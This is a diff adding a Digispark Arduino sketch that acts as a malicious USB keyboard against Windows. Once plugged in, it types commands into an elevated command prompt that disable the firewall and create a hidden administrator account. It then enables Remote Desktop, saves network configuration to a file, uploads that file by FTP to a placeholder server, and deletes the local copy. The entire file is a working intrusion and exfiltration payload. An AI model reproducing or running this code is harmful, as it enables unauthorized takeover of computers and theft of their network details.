@@ -1,0 +1,71 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(41);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.delay(400);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,MOD_SHIFT_LEFT,KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("netsh firewall set opmode mode=disable");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("ALT y");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("net user /add username password");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("net localgroup administrators username /add");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("sc config TermService start= auto");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("net start Termservice");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("cd %USERPROFILE%");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("ipconfig /all > number.txt");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("ftp -i ftp server");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("login name");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("login password");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("prompt");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("prompt");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("PUT number.txt");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("bye");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("del number.txt");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,44);
+  DigiKeyboard.print("c");
+}
